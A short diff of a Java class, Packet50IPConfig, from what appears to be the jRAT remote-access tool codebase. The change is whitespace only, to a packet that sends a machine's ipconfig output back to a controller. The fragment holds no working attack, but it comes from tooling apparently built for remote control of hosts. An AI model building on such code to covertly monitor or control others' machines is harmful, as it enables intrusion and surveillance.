@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet50IPConfig extends AbstractOutgoingPacket {
 
 	private String ipconfig;
-	
+
 	public Packet50IPConfig(String ipconfig) {
 		this.ipconfig = ipconfig;
 	}
